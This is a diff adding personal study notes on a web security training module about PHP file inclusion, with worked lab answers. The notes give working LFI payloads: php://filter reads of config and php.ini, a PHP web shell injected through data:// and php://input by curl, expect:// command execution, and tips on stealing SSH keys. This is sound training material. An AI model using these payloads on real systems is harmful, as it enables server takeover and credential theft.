@@ -286,14 +286,149 @@ http://94.237.54.176:38605/index.php?language=languages/....//....//....//....//
 And that works so I just need to do:
 `http://94.237.54.176:38605/index.php?language=languages/....//....//....//....//....//flag.txt`
 
-
 ## PHP Filters
+
+Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.
+
+PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks, but also with other web attacks like XXE, as covered in the Web Attacks module.
+
+In this section, we will see how basic PHP filters are used to read PHP source code, and in the next section, we will see how different PHP wrappers can help us in gaining remote code execution through LFI vulnerabilities.
+
+PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.
+
+The filter wrapper has several parameters, but the main ones we require for our attack are resource and read. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.
+
+There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.
+
+The first step would be to fuzz for different available PHP pages with a tool like ffuf or gobuster, as covered in the Attacking Web Applications with Ffuf module:
+
+Tip: Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
+
+Even after reading the sources of any identified files, we can scan them for other referenced PHP files, and then read those as well, until we are able to capture most of the web application's source or have an accurate image of what it does. It is also possible to start by reading index.php and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.
+
+In previous sections, if you tried to include any php files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page. For example, let's try to include the config.php page (.php extension appended by web application): 
+
+As we can see, we get an empty result in place of our LFI string, since the config.php most likely only sets up the web app configuration and does not render any HTML output.
+
+This may be useful in certain cases, like accessing local PHP pages we do not have access over (i.e. SSRF), but in most cases, we would be more interested in reading the PHP source code through LFI, as source codes tend to reveal important information about the web application. This is where the base64 php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including PHP files only, as discussed in the previous section.
+
+Note: The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we would directly get the source code, and would not need to use extra filters/functions to read the source code. Refer to the functions table in section 1 to see which functions have which privileges.
+
+Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the base64 PHP filter. Let's try to read the source code of config.php using the base64 filter, by specifying convert.base64-encode for the read parameter and config for the resource parameter, as follows:
+
+``` url
+php://filter/read=convert.base64-encode/resource=config
+```
+
+Note: We intentionally left the resource file at the end of our string, as the .php extension is automatically appended to the end of our input string, which would make the resource we specified be config.php.
+
+
+
+As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier. We can now decode this string to get the content of the source code of config.php, as follows:
+
+`echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d`
+
+Tip: When copying the base64 encoded string, be sure to copy the entire string or it will not fully decode. You can view the page source to ensure you copy the entire string.
+
+--------------
+
+The question in this section is:
+Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer 
+
+`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://94.237.61.226:37536/FUZZ -e .php -ic`
+
+I found this file:
+configure.php
+
+So now lets try `http://94.237.61.226:37536/index.php?language=php://filter/read=convert.base64-encode/resource=configure` and it returns encoded info.
+
+Then I can do:
+`echo "PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7" | base64 -d`
+
+And that gets the answer.
 
 # Remote Code Execution
 
 ## PHP Wrappers
 
+So far in this module, we have been exploiting file inclusion vulnerabilities to disclose local files through various methods. From this section, we will start learning how we can use file inclusion vulnerabilities to execute code on the back-end servers and gain control over them.
+
+We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function's capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like config.php, which may match a user's password in case they re-use the same password. Or we can check the .ssh directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (id_rsa) and use it to SSH into the system.
+
+Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications. We will build on what we learned in the previous section, and will utilize different PHP Wrappers to gain remote code execution. Then, in the upcoming sections, we will learn other methods to gain remote code execution that can be used with PHP and other languages as well.
+
+The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.
+
+To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:
+
+`curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`
+
+Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value:
+
+`echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include`
+
+Excellent! We see that we have this option enabled, so we can use the data wrapper. Knowing how to check for the allow_url_include option can be very important, as this option is not enabled by default, and is required for several other LFI attacks, like using the input wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.
+
+With allow_url_include enabled, we can proceed with our data wrapper attack. As mentioned earlier, the data wrapper can be used to include external data, including PHP code. We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code.
+
+So, our first step would be to base64 encode a basic PHP web shell, as follows:
+
+`echo '<?php system($_GET["cmd"]); ?>' | base64`
+
+Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass commands to the web shell with &cmd=<COMMAND>: 
+
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+
+Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier.
+
+To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:
+
+`curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid`
+
+Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
+
+Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.
+
+However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:
+
+```
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+extension=expect
+```
+
+As we can see, the extension configuration keyword is used to enable the expect module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the expect:// wrapper and then pass the command we want to execute, as follows:
+`curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`
+
+As we can see, executing commands through the expect module is fairly straightforward, as this module was designed for command execution, as mentioned earlier. The Web Attacks module also covers using the expect module with XXE vulnerabilities, so if you have a good understanding of how to use it here, you should be set up for using it with XXE.
+
+These are the most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the phar and zip wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.
+
+-----------------
+The question in this section is:
+Try to gain RCE using one of the PHP wrappers and read the flag at / 
+
+Lets start with getting the config:
+`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`
+
+Then decoding:
+I see the expect extension there.
+
+So I can just do:
+`expect://ls ../../../../`
+
+Except that isn't working...
+
+`curl -s "http://94.237.54.176:36435/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id"`
+This works.
+
+So lets just try:
+`curl -s "http://94.237.54.176:36435/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/"
+
+That reveals the flags name, then I can just do cat and get the answer.
+
 ## Remote File Inclusion (RFI)
+
+
 
 ## LFI and File Uploads
 
